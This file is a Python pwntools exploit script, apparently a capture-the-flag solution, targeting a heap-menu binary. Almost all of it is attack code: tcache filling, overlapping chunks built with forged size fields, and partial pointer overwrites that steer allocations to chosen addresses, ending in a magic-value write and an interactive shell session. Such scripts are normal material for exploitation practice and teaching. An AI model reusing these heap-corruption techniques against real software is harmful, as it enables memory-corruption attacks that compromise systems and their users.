#!/usr/bin/python3

from pwn import *

exe = ELF('c', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()


def s_cr(idx, sz, off, pa):
    sla(b'Delete', str(0))
    sla(b'Size: ', str(sz))
    sla(b'Index: ', str(idx))
    sla(b'Offset: ', str(off))
    sa(b'Buffer: ', pa)


def cr(idx, sz, pa):
    sla(b'Delete', str(1))
    sla(b'Size: ', str(sz))
    sla(b'Index: ', str(idx))
    sa(b'Buffer: ', pa)


def leak(idx):
    sla(b'Delete', str(2))
    sla(': ', str(idx))


def free(idx):
    sla(b'Delete', str(3))
    sla(': ', str(idx))


for i in range(2, 9):
    cr(i, 0x88, b'wan')
for i in range(9, 16):
    cr(i, 0x1a8, b'wan')

cr(0, 0x3e0-0x10, b'wan')
cr(1, 0x3f0-0x10, b'wan')
free(0)
free(1)

cr(16, 0x18, b'bbb')
cr(17, 0x88, b'a')
cr(18, 0x88, b'b')
cr(19, 0x88, b'c')
cr(20, 0x88, b'd')
cr(21, 0x18, b'bbb')
cr(22, 0x88, b'a')
cr(23, 0x88, b'b')
cr(24, 0x88, b'c')
cr(25, 0x88, b'd')
cr(26, 0x18, b'bbb')
for i in range(2, 9):
    free(i)
free(17)
free(18)
free(19)

free(22)
free(23)
free(24)
cr(27, 0x1a8, b'2'*0x118+p64(0x31))
cr(28, 0x1a8, b'1'*0x118+p64(0x21))

free(19)
free(24)
free(27)
free(28)

cr(29, 0x1a8, b'1'*0x88+p64(0xe1))
cr(30, 0x1a8, b'2'*0x88+p64(0xf1))

for i in range(9, 16):
    free(i)
free(18)
free(23)

free(29)
free(20)

cr(31, 0x38, b'X')
cr(32, 0x48, b'X')
cr(33, 0x38, b'X')
cr(34, 0x58, b'X')

cr(35, 0x108, b'1')
free(30)
free(25)

cr(36, 0x38, b'X')
cr(37, 0x48, b'X')
cr(38, 0x38, b'X')
cr(39, 0x58, b'X')

cr(40, 0x108, b'2')
cr(41, 0x108, b'3')
for i in range(42, 49):
    cr(i, 0x108, b'a')
for i in range(42, 49):
    free(i)
for i in range(54):
    cr(42, 0x3f8, b'wan')
cr(42, 0x288, b'a'*0xd0 + flat(0x10000, 0x20))
free(35)
free(41)
free(40)

s_cr(43, 0xd8, 0xa8, p16(0x5080))
cr(44, 0xe8, b'a'*0x90 + flat(0x406, 0x111) + p16(0x5080))
cr(45, 0x108, b'wan')
s_cr(45, 0x248, 0x1e0, p16(0x5010))
cr(46, 0x3d8, p8(0)*0x288)
cr(47, 0x18, b'A'*0x18)
cr(48, 0x18, b'A'*0x18)
cr(49, 0x188, b'A'*0x188)
cr(50, 0x188, b'A'*0x188)

free(47)
free(48)
free(49)
free(50)

free(46)
s_cr(51, 0x288, 0x78, p64(0x191)+p16(0x52a0))
cr(52, 0x18, b'???')
free(46)
s_cr(51, 0x288, 0x138, p16(0x5090))

cr(52, 0x188, b'Next alloc is winz!')
cr(53, 0x188, p64(0x37C3C7F))
p.interactive()
